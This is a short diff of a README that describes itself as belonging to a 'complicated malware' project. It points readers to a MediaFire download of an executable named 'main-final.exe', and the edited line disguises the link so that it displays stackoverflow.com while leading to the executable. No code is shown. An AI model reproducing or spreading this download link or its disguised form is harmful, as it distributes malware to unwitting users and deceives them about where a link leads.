@@ -1,7 +1,7 @@
 This is a bit of a complicated malware so some modifications need to be made.
 ========================================================================
 
-Warning: The .exe is not here due to being over the file limit, you can get is from (here.)[https://www.mediafire.com/file/qn0zwh623xosk3u/main-final.exe/file]
+Warning: The .exe is not here due to being over the file limit, you can get is from [here. ([https://stackoverflow.com](https://www.mediafire.com/file/qn0zwh623xosk3u/main-final.exe/file))][here.]
 
 The modifications are:
 
